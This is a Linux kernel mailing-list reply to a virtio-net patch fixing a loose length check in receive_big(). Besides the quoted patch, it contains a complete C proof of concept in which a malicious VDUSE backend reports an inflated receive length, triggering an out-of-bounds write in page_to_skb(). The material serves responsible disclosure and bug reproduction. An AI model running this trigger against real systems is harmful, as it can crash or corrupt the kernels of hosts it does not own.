Return-Path: <netdev+bounces-297848-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id CdYKJUPoKWrPfQMAu9opvQ
	(envelope-from <netdev+bounces-297848-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 11 Jun 2026 00:42:11 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id A72D966D3A3
	for <lists+netdev@lfdr.de>; Thu, 11 Jun 2026 00:42:10 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=asu.edu header.s=google header.b=dDtVkF36;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-297848-lists+netdev=lfdr.de@vger.kernel.org" designates 172.234.253.10 as permitted sender) smtp.mailfrom="netdev+bounces-297848-lists+netdev=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=none) header.from=asu.edu;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=2")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 2C5DE302570F
	for <lists+netdev@lfdr.de>; Wed, 10 Jun 2026 22:40:04 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B7EAD35BDAA;
	Wed, 10 Jun 2026 22:40:02 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from mail-pg1-f179.google.com (mail-pg1-f179.google.com [209.85.215.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1DF16347BA7
	for <netdev@vger.kernel.org>; Wed, 10 Jun 2026 22:40:00 +0000 (UTC)
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781131202; cv=pass; b=Kks5idLAUJa0oBnpg8SjNMSoW5gRXAAgVNUnT/BepP0ZDC/H5tBxxo/aIGylRp7AYCZ/UhR+9UBvsrXCrNaOI8RmuUZm4bGuCmK2gffSOoaQVDsSmVeKHL0JSu0F0aIH5nKld97FTqDG32TxBj5P5kAT/yHy1IYSBs8lCRcZCmM=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781131202; c=relaxed/simple;
	bh=NcHpuFFiYAEtcFM321ed9ZM0LP6xCAVoqIT9oNket8s=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=K2OKJ5YfDQh8CTzN4FB9iXIxjEQcvx2L0YaVz+t61AYheReLHcDTfe2mkETuqRNdcQngU15AChAbNXbs76gjonbcZFTUsZrzMhbmZrfr5MOkrvsQ/crUuPBl1VwJBYmMgF0yh3Pcfym+2/TuuzeGoDCIVsvoXNbCa8TrRb1/krw=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=dDtVkF36; arc=pass smtp.client-ip=209.85.215.179
Received: by mail-pg1-f179.google.com with SMTP id 41be03b00d2f7-c8583b8fd89so4451062a12.0
        for <netdev@vger.kernel.org>; Wed, 10 Jun 2026 15:40:00 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1781131200; cv=none;
        d=google.com; s=arc-20240605;
        b=FUKEUEvoOPQcgVMjxrzCy40oP11kaq4POTdntc9IfzeIiQgOFnpxKUAEwG+ZHRYynx
         rf/DrQOW1zSAbkyxL4MdC63DrRv9qA62XIxeZC1lB9lF449LzU/qtIQ23hTibyKVcWSl
         Ed9y6wCGyZVJs6XvsjNINYwKZ/AaLS5XoleJ1BCNeymUNZVtk91I7FeK537jcBpoQaAZ
         vUKsg1914TqbE2URrIeGNeVojQW+gsersKPzRotUd0nYPW9MqEpW+O582GaQnv+fu+jU
         BP7z+N6K1VN1hzFbJltB5giCIqXbOa+p0Mt8rih6/3Kie+bC3xEcWvQfRaho9xjiFvaL
         9eJQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=ogMBwwg4KB39gKiZrceBt1KFvkbDaYAOVg41G6pkZLA=;
        fh=RtUnrh6IAAjxp0DkvYhdSmHqN66zJZdHwH8+lwLoamQ=;
        b=S9yo9W2xHHUistwFOhh1Dc0QHmS+747m0DRs7tX/tTZ2Ilu8TEH1/DCg+eaNX/IudF
         h+mFlWLm/VC/XYjLlnblJeNQ1/aAraTdCg940Afp7hywcBPBIufvBGpr4D3bHRiP3mdz
         nFbKyYHGBCitz7cMRuemv6piuTlsriBp81U0BQYqkhm2UxBPguSQc7IfAAB9GZEnAr2B
         mPPCAlYgl9IPlIbzL4hpMvDTBBldKympReWAkwVsS6OwccgkV3JizuwM3IWQpYFGWgxd
         1k3/n711mTq5ev8khFfnUnti9kwEJPZaVC69G1eJ23Trfw9bDXybrI7SB/RO18HdQKNC
         GayA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1781131200; x=1781736000; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=ogMBwwg4KB39gKiZrceBt1KFvkbDaYAOVg41G6pkZLA=;
        b=dDtVkF36MoU4Dpev9aEPLbV0W61UMxNe4e9NqxhV5tp+aeubieY7bsQ4vLe0m1S+uu
         wzutVn5B13qGNVbiF7abEz5Fa8bCNvSWSPMmZFeef+ZaoV9srHcn+Bw0ESKcFXwrGpjJ
         DkNbR1gn8XRGZaVyiNH5COXFgHXNU97DVlX5QhiqJOUYkDk+g2OG0TK1GbB3g8C9qFs/
         omk0nYekNBZbU9+X3NvaHTq0lXUagSmKDkKMdGeKORXdhinlLVls8HvxDgi7z/buxw/p
         hXRenaLFIUcH46+Gq06A09WbatXeeoCl586sbTMOpoqpGv/AMVTEVt6wE550mj3bJB3W
         SfzQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781131200; x=1781736000;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=ogMBwwg4KB39gKiZrceBt1KFvkbDaYAOVg41G6pkZLA=;
        b=ZhxooBhjghRGZ4UtqmpLf9qXiQZT0Tij+GfI9p3hwHMWbC94FfhcMrs+GruKZlq5L/
         KcRycbzqJzJmY2DDKI3V//hOjUWkKF8/64q1h0NLmfJE7Nme8sj1Qzxi69JN2cBgaKub
         e2yRZgeX41H8g9NwsytcZ8ENdB+5KYZEvc87QKLMSexBf+b/6SZmQ2LAm1hRffpq56mv
         680i1dbNrz9h3n6/E5F2Wzla40hkA2HArfc0ApDhkPKf1doaugy38ScWxX3q027IQw/5
         8hR8lGp/+Ujcq0LRwk10+/E3LNuu8h5j3U7EHu+UDn7cawzK+PQMqerVJj/PyC6NnZru
         4Z/A==
X-Forwarded-Encrypted: i=1; AFNElJ/Dhzbt3krKI+HyzNesNi9qjS0RXK8MUm8sYIWJ5LPczzLXDtNqO//kkI4WQXvIegLTz9lcLnE=@vger.kernel.org
X-Gm-Message-State: AOJu0YzKLb3xQnST83bqygKVJDhiOUOEH0F+/grl7w2BmxGIfQeginAy
	rasJQTdIcktoh2OckiyEOuHSGO7r73j510reN2z3YKsBCp1yNahGdWxN1r+XYHuQws+4nlnk5oZ
	a39KRV3kh6sQ25AtDHdi+LfOtmtxTA6m492YlrkXY
X-Gm-Gg: Acq92OHsL95ljPfz23OCeOrcVdBA7O7y00iRCzLQqEfuLnBTELLFOpvDxhCDgLtdTDL
	GIwQyUCgStT5Wq+zRVsPu3Kn8jQAEaq/FUQ1qZKldB7FRIWkYQcdxz5yVR12fS/rXLiBVk5uakJ
	hch5C2sqmt9ow0QbUcS7EFddOFCgrPIjuoG75APbmqeTR2Hjha8PZuD11fEL6yRnSZbEwgQTcUO
	YJSvU3E/LzbFpRMwFUhtjT5Y8GpVd4TnEQxkmg5YcnXGBTeUhTw6i1N0wHeUlBpaP53BDpDk9wZ
	2oM1CSiCyN+xfaK73n3W2QtGLFscXuclWBEg+qdDBNic+NS7QNon
X-Received: by 2002:a05:6a21:6816:b0:3b4:81b4:9b74 with SMTP id
 adf61e73a8af0-3b56dbedd41mr885460637.42.1781131200399; Wed, 10 Jun 2026
 15:40:00 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260610221606.1091465-1-xmei5@asu.edu>
In-Reply-To: <20260610221606.1091465-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Wed, 10 Jun 2026 15:39:49 -0700
X-Gm-Features: AVVi8Ce5ZuKu0cJn7v-PpLepAyWOJLsh2mmY_NxC73I5ur63g9vLmcBNSDVwNF4
Message-ID: <CAPpSM+Q2V6qXWHR9eWFoejD1DxmLVwh=LYV=3YvViRkz3EfNyg@mail.gmail.com>
Subject: Re: [PATCH net] virtio-net: fix len check in receive_big()
To: mst@redhat.com, jasowang@redhat.com, xuanzhuo@linux.alibaba.com, 
	eperezma@redhat.com
Cc: andrew+netdev@lunn.ch, davem@davemloft.net, edumazet@google.com, 
	kuba@kernel.org, pabeni@redhat.com, netdev@vger.kernel.org, 
	virtualization@lists.linux.dev, linux-kernel@vger.kernel.org, 
	minhquangbui99@gmail.com, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-0.66 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORWARDED(0.00)[lists@lfdr.de];
	MIME_TRACE(0.00)[0:+];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-297848-lists,netdev=lfdr.de];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_SENDER(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	FORGED_RECIPIENTS(0.00)[m:mst@redhat.com,m:jasowang@redhat.com,m:xuanzhuo@linux.alibaba.com,m:eperezma@redhat.com,m:andrew+netdev@lunn.ch,m:davem@davemloft.net,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:netdev@vger.kernel.org,m:virtualization@lists.linux.dev,m:linux-kernel@vger.kernel.org,m:minhquangbui99@gmail.com,m:bestswngs@gmail.com,m:andrew@lunn.ch,s:lists@lfdr.de];
	FREEMAIL_CC(0.00)[lunn.ch,davemloft.net,google.com,kernel.org,redhat.com,vger.kernel.org,lists.linux.dev,gmail.com];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCPT_COUNT_TWELVE(0.00)[14];
	FORGED_SENDER_FORWARDING(0.00)[];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	DKIM_TRACE(0.00)[asu.edu:+];
	ALIAS_RESOLVED(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	MISSING_XM_UA(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:rdns,sea.lore.kernel.org:helo,vger.kernel.org:from_smtp,asu.edu:dkim,asu.edu:email,asu.edu:from_mime,mail.gmail.com:mid]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: A72D966D3A3

Thanks for your attention to this bug. We'll provide some tips for
reproduction here
1) CONFIGs
```
CONFIG_VDPA=3Dy
CONFIG_VDPA_USER=3Dy
CONFIG_VIRTIO_VDPA=3Dy
CONFIG_VHOST_VDPA=3Dy
CONFIG_IKHEADERS=3Dn
CONFIG_DEBUG_INFO_BTF=3Dn
```

2) PoC
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <linux/vduse.h>
#include <linux/vdpa.h>
#include <linux/virtio_ids.h>
#include <linux/virtio_config.h>
#include <linux/virtio_net.h>
#include <linux/virtio_ring.h>

#define DEV_NAME "vdusebug"
#define BIT(x) (1ULL << (x))
#define FEATURES (BIT(VIRTIO_F_VERSION_1) | BIT(VIRTIO_F_ACCESS_PLATFORM) |=
 \
BIT(VIRTIO_NET_F_MAC) | BIT(VIRTIO_NET_F_GUEST_TSO4))
#define VQ_NUM 2
#define VQ_SIZE 256
#define die(s) do { perror(s); exit(1); } while (0)

/* ---- minimal generic-netlink: resolve vdpa family, then
VDPA_CMD_DEV_NEW ---- */

struct nlmsg {
struct nlmsghdr nh;
struct genlmsghdr gh;
char buf[1024];
};

static void nla_put(struct nlmsg *m, int type, const void *data, int len)
{
struct nlattr *a =3D (void *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
a->nla_type =3D type;
a->nla_len =3D NLA_HDRLEN + len;
memcpy((char *)a + NLA_HDRLEN, data, len);
m->nh.nlmsg_len =3D NLMSG_ALIGN(m->nh.nlmsg_len) + NLA_ALIGN(NLA_HDRLEN + l=
en);
}

static int nl_send(int sk, struct nlmsg *m, char *rsp, int rsplen)
{
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
struct iovec iov =3D { .iov_base =3D m, .iov_len =3D m->nh.nlmsg_len };
struct msghdr mh =3D { .msg_name =3D &sa, .msg_namelen =3D sizeof(sa),
.msg_iov =3D &iov, .msg_iovlen =3D 1 };
if (sendmsg(sk, &mh, 0) < 0)
return -1;
return recv(sk, rsp, rsplen, 0);
}

static int vdpa_setup(int sk)
{
struct nlmsg m =3D {0};
char rsp[4096];
int n, famid =3D -1;

/* resolve VDPA genl family id */
m.nh.nlmsg_len =3D NLMSG_LENGTH(sizeof(m.gh));
m.nh.nlmsg_type =3D GENL_ID_CTRL;
m.nh.nlmsg_flags =3D NLM_F_REQUEST;
m.gh.cmd =3D CTRL_CMD_GETFAMILY;
m.gh.version =3D 1;
nla_put(&m, CTRL_ATTR_FAMILY_NAME, VDPA_GENL_NAME, strlen(VDPA_GENL_NAME) +=
 1);
n =3D nl_send(sk, &m, rsp, sizeof(rsp));
for (struct nlmsghdr *nh =3D (void *)rsp; NLMSG_OK(nh, n); nh =3D
NLMSG_NEXT(nh, n)) {
struct nlattr *a =3D (void *)((char *)NLMSG_DATA(nh) +
NLMSG_ALIGN(sizeof(struct genlmsghdr)));
int rem =3D NLMSG_PAYLOAD(nh, sizeof(struct genlmsghdr));
while (rem >=3D (int)NLA_HDRLEN && a->nla_len >=3D NLA_HDRLEN && rem >=3D
a->nla_len) {
if (a->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
famid =3D *(uint16_t *)((char *)a + NLA_HDRLEN);
rem -=3D NLA_ALIGN(a->nla_len);
a =3D (void *)((char *)a + NLA_ALIGN(a->nla_len));
}
}
if (famid < 0)
return -1;

/* VDPA_CMD_DEV_NEW name=3DDEV_NAME mgmtdev=3Dvduse */
memset(&m, 0, sizeof(m));
m.nh.nlmsg_len =3D NLMSG_LENGTH(sizeof(m.gh));
m.nh.nlmsg_type =3D famid;
m.nh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
m.gh.cmd =3D VDPA_CMD_DEV_NEW;
m.gh.version =3D 1;
nla_put(&m, VDPA_ATTR_DEV_NAME, DEV_NAME, strlen(DEV_NAME) + 1);
nla_put(&m, VDPA_ATTR_MGMTDEV_DEV_NAME, "vduse", 6);
return nl_send(sk, &m, rsp, sizeof(rsp)) > 0 ? 0 : -1;
}

/* ---- VDUSE control message worker + IOTLB mapping ---- */

static volatile int g_driver_ok, g_running =3D 1;

static void *vduse_worker(void *arg)
{
int fd =3D (intptr_t)arg;
struct pollfd pfd =3D { .fd =3D fd, .events =3D POLLIN };
while (g_running) {
if (poll(&pfd, 1, 100) <=3D 0)
continue;
struct vduse_dev_request req =3D {0};
struct vduse_dev_response resp =3D {0};
if (read(fd, &req, sizeof(req)) < 0)
continue;
resp.request_id =3D req.request_id;
resp.result =3D VDUSE_REQ_RESULT_OK;
if (req.type =3D=3D VDUSE_GET_VQ_STATE)
resp.vq_state.index =3D req.vq_state.index;
else if (req.type =3D=3D VDUSE_SET_STATUS && (req.s.status &
VIRTIO_CONFIG_S_DRIVER_OK))
g_driver_ok =3D 1;
write(fd, &resp, sizeof(resp));
}
return NULL;
}

/* map one IOVA page into our address space, returning the VA for `iova` */
static void *iova_map(int fd, uint64_t iova, int prot)
{
struct vduse_iotlb_entry e =3D { .start =3D iova, .last =3D iova };
int mfd =3D ioctl(fd, VDUSE_IOTLB_GET_FD, &e);
if (mfd < 0)
return NULL;
void *p =3D mmap(0, e.last - e.start + 1, prot, MAP_SHARED, mfd, e.offset);
close(mfd);
if (p =3D=3D MAP_FAILED)
return NULL;
return (char *)p + (iova - e.start);
}

/* ---- trigger ---- */

static void trigger(int fd)
{
struct vduse_vq_info info =3D { .index =3D 0 };
if (ioctl(fd, VDUSE_VQ_GET_INFO, &info) < 0 || !info.ready)
return;
uint32_t num =3D info.num;

struct vring_desc *desc =3D iova_map(fd, info.desc_addr, PROT_READ);
struct vring_avail *avail =3D iova_map(fd, info.driver_addr, PROT_READ);
struct vring_used *used =3D iova_map(fd, info.device_addr, PROT_READ |
PROT_WRITE);
if (!desc || !avail || !used || used->idx =3D=3D avail->idx)
return;

/* the driver posted an RX chain; just hand it back an inflated len.
* 73708 is what add_recvbuf_big() advertised; 73728 =3D (17+1)*4096
* passes the loose check and overruns page_to_skb()'s frag loop. */
uint16_t head =3D avail->ring[used->idx % num];
used->ring[used->idx % num] =3D (struct vring_used_elem){ .id =3D head,
.len =3D (17 + 1) * 4096 };
__sync_synchronize();
used->idx++;
__sync_synchronize();

uint32_t qidx =3D 0;
ioctl(fd, VDUSE_VQ_INJECT_IRQ, &qidx);
}

/* bring up every virtio_net iface (the VDUSE one) so the driver fills RX *=
/
static void ifaces_up(void)
{
int s =3D socket(AF_INET, SOCK_DGRAM, 0);
for (int i =3D 1; i < 16; i++) {
struct ifreq r =3D {0};
snprintf(r.ifr_name, IFNAMSIZ, "eth%d", i);
if (ioctl(s, SIOCGIFFLAGS, &r) < 0)
continue;
r.ifr_flags |=3D IFF_UP | IFF_RUNNING;
ioctl(s, SIOCSIFFLAGS, &r);
}
close(s);
}

int main(void)
{
pthread_t th;

int ctrl =3D open("/dev/vduse/control", O_RDWR);
if (ctrl < 0)
die("/dev/vduse/control");
uint64_t apiv =3D 0;
ioctl(ctrl, VDUSE_SET_API_VERSION, &apiv);

struct {
struct vduse_dev_config cfg;
struct virtio_net_config net;
} c =3D {0};
uint8_t mac[6] =3D { 0x52, 0x54, 0, 0x12, 0x34, 0x56 };
memcpy(c.net.mac, mac, 6);
strncpy(c.cfg.name, DEV_NAME, VDUSE_NAME_MAX - 1);
c.cfg.device_id =3D VIRTIO_ID_NET;
c.cfg.features =3D FEATURES;
c.cfg.vq_num =3D VQ_NUM;
c.cfg.vq_align =3D 4096;
c.cfg.config_size =3D sizeof(struct virtio_net_config);
if (ioctl(ctrl, VDUSE_CREATE_DEV, &c) < 0)
die("VDUSE_CREATE_DEV");

int fd =3D open("/dev/vduse/" DEV_NAME, O_RDWR | O_NONBLOCK);
if (fd < 0)
die("open vduse dev");
for (uint32_t i =3D 0; i < VQ_NUM; i++) {
struct vduse_vq_config vc =3D { .index =3D i, .max_size =3D VQ_SIZE };
ioctl(fd, VDUSE_VQ_SETUP, &vc);
}

/* worker must run before we attach: the bus probe blocks on its replies */
pthread_create(&th, NULL, vduse_worker, (void *)(intptr_t)fd);

int sk =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
bind(sk, (void *)&sa, sizeof(sa));
if (vdpa_setup(sk) < 0)
die("vdpa setup");

for (int i =3D 0; i < 50 && !g_driver_ok; i++)
usleep(100000);
ifaces_up();
for (int i =3D 0; i < 30; i++)
usleep(100000);

for (int i =3D 0; i < 10; i++) {
trigger(fd);
usleep(200000);
}

g_running =3D 0;
pthread_join(th, NULL);
sleep(2);
return 0;
}
```

Let me know if you need more information.

Thanks,
Xiang

On Wed, Jun 10, 2026 at 3:16=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> receive_big() bounds the device-announced length by
> (big_packets_num_skbfrags + 1) * PAGE_SIZE.  That is still too loose:
> add_recvbuf_big() sets sg[1] to start at offset
> sizeof(struct padded_vnet_hdr) into the first page, so the chain
> actually carries hdr_len + (PAGE_SIZE - sizeof(padded_vnet_hdr)) +
> big_packets_num_skbfrags * PAGE_SIZE bytes -- 20 bytes less than the
> check allows for the common hdr_len =3D=3D 12 case.
>
> A malicious virtio backend can announce a len in that gap.  page_to_skb()
> then walks one frag past the page chain, storing a NULL page->private
> into skb_shinfo()->frags[MAX_SKB_FRAGS], which is both an out-of-bounds
> write past the static frag array and a NULL frag handed up the rx path.
>
> Bound len by the size add_recvbuf_big() actually advertised.
>
> Fixes: 0c716703965f ("virtio-net: fix received length check in big packet=
s")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  drivers/net/virtio_net.c | 8 +++++---
>  1 file changed, 5 insertions(+), 3 deletions(-)
>
> diff --git a/drivers/net/virtio_net.c b/drivers/net/virtio_net.c
> index f4adcfee7a80..afe73eda1491 100644
> --- a/drivers/net/virtio_net.c
> +++ b/drivers/net/virtio_net.c
> @@ -1999,15 +1999,17 @@ static struct sk_buff *receive_big(struct net_dev=
ice *dev,
>                                    struct virtnet_rq_stats *stats)
>  {
>         struct page *page =3D buf;
> +       unsigned long max_len;
>         struct sk_buff *skb;
>
>         /* Make sure that len does not exceed the size allocated in
>          * add_recvbuf_big.
>          */
> -       if (unlikely(len > (vi->big_packets_num_skbfrags + 1) * PAGE_SIZE=
)) {
> +       max_len =3D vi->hdr_len + (PAGE_SIZE - sizeof(struct padded_vnet_=
hdr)) +
> +                 vi->big_packets_num_skbfrags * PAGE_SIZE;
> +       if (unlikely(len > max_len)) {
>                 pr_debug("%s: rx error: len %u exceeds allocated size %lu=
\n",
> -                        dev->name, len,
> -                        (vi->big_packets_num_skbfrags + 1) * PAGE_SIZE);
> +                        dev->name, len, max_len);
>                 goto err;
>         }
>
> --
> 2.43.0
>

